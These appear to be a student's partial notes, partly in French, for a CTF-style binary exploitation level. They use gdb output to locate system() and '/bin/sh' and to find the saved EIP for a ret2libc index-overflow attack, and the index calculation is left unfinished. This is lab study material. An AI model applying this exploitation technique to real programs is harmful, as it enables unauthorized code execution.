index overflow
pas d'utilisation possible de l'env car clear au début du code !!


### Find occurance of /bin/sh

(gdb) break main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) print &system  
$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh" 
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) 

system address : 0xf7e6aed0
bin/sh address : 0xf7f897ec

### Find EIP of main function
(gdb) b main
Note: breakpoint 1 also set at pc 0x8048729.
Breakpoint 3 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 
Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebp at 0xffffd708, eip at 0xffffd70c
(gdb) 

=> eip address 0xffffd70c de la fonction main

### Find address of tab[100]


### Calculate tab index to overwrite

interval between eip and tab 0xffffd70c - ? = ?

!!! Devise by 4
















We get `0xf7e6aed0` and `0xf7f897ec`, which we'll set at `eip` and `eip+8`.
